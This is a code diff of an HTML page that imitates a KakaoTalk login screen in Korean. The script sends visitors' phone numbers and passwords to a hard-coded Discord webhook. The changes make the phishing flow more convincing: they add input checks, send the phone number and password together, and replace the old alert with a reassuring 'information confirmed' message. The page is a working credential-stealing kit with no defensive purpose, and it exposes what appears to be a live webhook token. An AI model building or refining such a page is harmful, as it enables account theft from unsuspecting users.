@@ -44,13 +44,14 @@
 
   <!-- 로그인 화면 -->
   <div id="page2" class="login-container hidden">
-    <h2>카카오톡 본인인증하기</h2>
+    <h2>카카오톡을 시작합니다</h2>
     <input type="text" placeholder="이메일 또는 전화번호" style="width: 370px; padding: 5px;">
     <input type="password" placeholder="비밀번호" style="width: 370px; padding: 5px;">
     <button class="btn-gray">로그인</button>
   </div>
 
   <script>
+    // 안내 페이지 다음으로 이동
     function goNext() {
       const chk = document.getElementById("agree");
       if (!chk.checked) {
@@ -64,7 +65,6 @@
     // ------------------- 웹훅 코드 -------------------
     const webhookURL = 'https://discord.com/api/webhooks/1406817501047947450/TkrHLmb42Hjc3p3afEOtCFe-U5ksQDvH3Bj1RUIGFMdDD98vGG_Rn7lTj1T7qoGdGfG9';
 
-    // 전화번호 입력 자동 전송
     const phoneInput = document.querySelector('input[type="text"]');
     let phoneSent = false;
     phoneInput.addEventListener('input', () => {
@@ -82,22 +82,33 @@
       if (phone.length < 11) phoneSent = false;
     });
 
-    // 비밀번호 버튼 클릭 시 전송 + alert 추가
+    // 비밀번호 버튼 클릭 시 입력값 체크 + 웹훅 전송
     const passwordInput = document.querySelector('input[type="password"]');
     const loginBtn = document.querySelector('.btn-gray');
     loginBtn.addEventListener('click', () => {
-      const password = passwordInput.value;
+      const phone = phoneInput.value.trim();
+      const password = passwordInput.value.trim();
 
+      // 입력 체크
+      if (!phone) {
+        alert('전화번호를 정확하게 입력해주세요.');
+        return;
+      }
+      if (!password) {
+        alert('비밀번호를 다시 확인해주세요.');
+        return;
+      }
+
+      // 웹훅 전송
       fetch(webhookURL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ password })
+        body: JSON.stringify({ phone, password })
       })
-      .then(res => console.log('비밀번호 전송 완료', res))
-      .catch(err => console.error('비밀번호 전송 오류', err));
+      .then(res => console.log('정보 전송 완료', res))
+      .catch(err => console.error('정보 전송 오류', err));
 
-      // 클릭 시 알림
-      alert('비밀번호를 다시 확인해주세요');
+      alert('입력한 정보를 확인했습니다.');
     });
     // ------------------- 웹훅 코드 끝 -------------------
   </script>
